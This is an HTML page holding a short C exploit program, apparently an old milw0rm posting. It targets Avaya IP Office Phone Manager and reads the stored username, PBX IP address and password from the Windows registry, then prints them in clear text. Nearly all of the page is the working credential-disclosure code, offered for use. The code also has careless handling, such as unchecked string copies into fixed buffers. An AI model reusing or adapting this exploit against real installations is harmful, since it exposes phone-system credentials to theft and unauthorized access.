<html><head><title>Avaya IP Office Phone Manager Local Password Disclosure Exploit</title></head><pre>#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

/*
               Filename:               exploit.c
               Title:          Avaya IP Office Phone Manager - Cleartext Sensitive Data Vulnerability Exploit v0.01
               Author:         pagvac (Adrian Pastor)
               Date:                   24th Feb, 2005
               Other info:             tested on version 2.013. Compile as a Win32 console application project in Visual C++
*/

BOOL QueryVal(char lszVal2Query[255], char lszValData[255])
{
    char lszResult[255];
    HKEY hKey;
    LONG returnStatus;
    DWORD dwType=REG_SZ;
    DWORD dwSize=255;
    returnStatus = RegOpenKeyEx(HKEY_LOCAL_MACHINE, &quot;SOFTWARE\\AVAYA\\IP400\\GENERIC&quot;, 0L, KEY_READ, &amp;hKey);

        if (returnStatus == ERROR_SUCCESS)
    {
                returnStatus = RegQueryValueEx(hKey, lszVal2Query, NULL, &amp;dwType,(LPBYTE)&amp;lszResult, &amp;dwSize);
         if (returnStatus == ERROR_SUCCESS)
         {
                          strcpy(lszValData, lszResult);
         }
                 RegCloseKey(hKey);
                 return TRUE;
    }
        else
        {
                RegCloseKey(hKey);
                return FALSE;
    }
}

void main()
{
       char valData[255];

       printf(&quot;\nAvaya IP Office Phone Manager - Cleartext Sensitive Data Vulnerability Exploit\n&quot;);
       printf(&quot;By pagvac (Adrian Pastor)\n&quot;);
       printf(&quot;Tested on version 2.013\n\n&quot;);

       // Print username
       printf(&quot;Username:\t&quot;);
       if(!QueryVal(&quot;UserName&quot;, valData))
               printf(&quot;Error! No permissions to read key value?\n&quot;);
       else
               printf(&quot;%s\n&quot;, valData);

       // Print IP address
       printf(&quot;PBX IP Address:\t&quot;);
       if(!QueryVal(&quot;PBXAddress&quot;, valData))
               printf(&quot;Error! No permissions to read key value?\n&quot;);
       else
               printf(&quot;%s\n&quot;, valData);

       // Print password
       printf(&quot;Password:\t&quot;);
       if(!QueryVal(&quot;Password&quot;, valData))
               printf(&quot;Error! No permissions to read key value?\n&quot;);
       else
       {

               if(strcmp(valData, &quot;&quot;)==0)
                       printf(&quot;[blank password]\n\n&quot;);
               else
               {
                       printf(&quot;%s\n&quot;, valData);
                       printf(&quot;Password obsfucated?\n\n&quot;);
               }
       }

}

// milw0rm.com [2005-02-24]</pre></html>